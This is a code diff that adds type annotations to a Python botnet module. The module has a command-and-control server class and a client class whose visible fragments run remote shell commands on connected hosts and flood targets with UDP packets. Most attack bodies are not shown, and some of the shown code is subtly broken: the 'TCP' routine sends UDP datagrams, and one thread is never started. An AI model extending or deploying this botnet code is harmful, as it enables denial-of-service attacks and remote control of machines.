@@ -27,7 +27,7 @@ class ServerBotnet:
         threading.Thread(target=self._acceptConnection).start()
 
     
-    def _acceptConnection(self):
+    def _acceptConnection(self) -> None:
         """ Accept new connections """
 
         while self.exit == False:
@@ -36,7 +36,7 @@ class ServerBotnet:
             self.conns.update({addr[0]: conn})
 
     
-    def stopServer(self):
+    def stopServer(self) -> None:
         """ Stop the server """
 
         for host in self.conns:
@@ -69,7 +69,7 @@ class ServerBotnet:
             logging.error("Invalid Protocoll: " + protocol)
     
 
-    def stopAttack(self):
+    def stopAttack(self) -> None:
         """ Stop the attack """
 
         for conn in self.conns:
@@ -115,7 +115,7 @@ class ServerBotnet:
         return alives
     
     
-    def shell(self, host: str, command: str):
+    def shell(self, host: str, command: str) -> bytes | bool:
         """ Execute a shell command """
 
         if host in self.conns:
@@ -152,13 +152,13 @@ class ServerBotnet:
         self.conns.clear()
 
 
-    def connectedHosts(self):
+    def connectedHosts(self) -> list:
         """ Return all the connected hosts """
 
         return [host for host in self.conns]
 
 
-    def os(self, host: str):
+    def os(self, host: str) -> str | bool:
         """ Return the operative system of a host """
 
         if host in self.conns:
@@ -183,7 +183,7 @@ class ClinetBotnet():
         self.lock = threading.Lock()
     
 
-    def connect(self):
+    def connect(self) -> None:
         """ Connect to the ServerBotnet """
 
         try:
@@ -194,7 +194,7 @@ class ClinetBotnet():
             logging.error(e)
 
 
-    def listen(self):
+    def listen(self) -> None:
         """ Listen for commands """
 
         command = b""
@@ -241,7 +241,7 @@ class ClinetBotnet():
                 s.close()
     
 
-    def _sendUdp(self, host: str, port: int, Bytes: int):
+    def _sendUdp(self, host: str, port: int, Bytes: int) -> None:
         """ Send UDP packets until it reaches the maximum number of packets set """
 
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -255,7 +255,7 @@ class ClinetBotnet():
 
 
 
-    def udp(self, host: str, port: str, time: int = 60, Bytes: int = 64):
+    def udp(self, host: str, port: str, time: int = 60, Bytes: int = 64) -> None:
         """ Start the UDP stress process """
 
         self.time = time + now()
@@ -263,7 +263,7 @@ class ClinetBotnet():
             threading.Thread(target=self._sendUdp, args=(host, port, Bytes,)).start()
     
 
-    def _sendTcp(self, host: str, port: int, Bytes: int):
+    def _sendTcp(self, host: str, port: int, Bytes: int) -> None:
         """ Send UDP packets until it reaches the maximum number of packets set """
 
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -283,7 +283,7 @@ class ClinetBotnet():
             logging.error(e)
 
 
-    def tcp(self, host: str, port: str, time: int = 60, Bytes: int = 64):
+    def tcp(self, host: str, port: str, time: int = 60, Bytes: int = 64) -> None:
         """ Start the UDP stress process """
 
         self.time = time + now()
@@ -291,7 +291,7 @@ class ClinetBotnet():
             threading.Thread(target=self._sendUdp, args=(host, port, Bytes,))
     
 
-    def shell(self, command: str):
+    def shell(self, command: str) -> str:
         """ Execute shell command """
 
         try:
